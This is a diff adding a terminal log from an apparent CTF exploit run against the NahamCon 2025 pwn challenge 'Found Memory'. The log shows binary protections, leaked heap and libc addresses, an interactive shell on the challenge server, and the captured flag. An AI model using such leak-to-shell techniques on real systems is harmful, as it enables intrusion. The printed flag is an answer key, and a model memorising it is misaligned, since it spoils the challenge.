@@ -1,0 +1,21 @@
+mito@mito-virtual-machine:~/CTF/NahamCon_CTF_2025/Pwn_Found_Memory$ python3 solve.py r
+[+] Opening connection to challenge.nahamcon.com on port 32611: Done
+[*] '/home/mito/CTF/NahamCon_CTF_2025/Pwn_Found_Memory/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+heap_leak = 0x5c7773cfd2a0
+heap_base = 0x5c7773cfd000
+libc_leak = 0x7b8cae8e9be0
+libc_base = 0x7b8cae6fd000
+[*] Switching to interactive mode
+$ id
+uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
+$ ls -l
+total 24
+-r--r--r-- 1 root root    39 May 23 18:07 flag.txt
+---x--x--x 1 root root 17256 May 23 18:07 found_memory
+$ cat flag.txt
+flag{04b12c28513188fbf6513f8d080b9ee1}
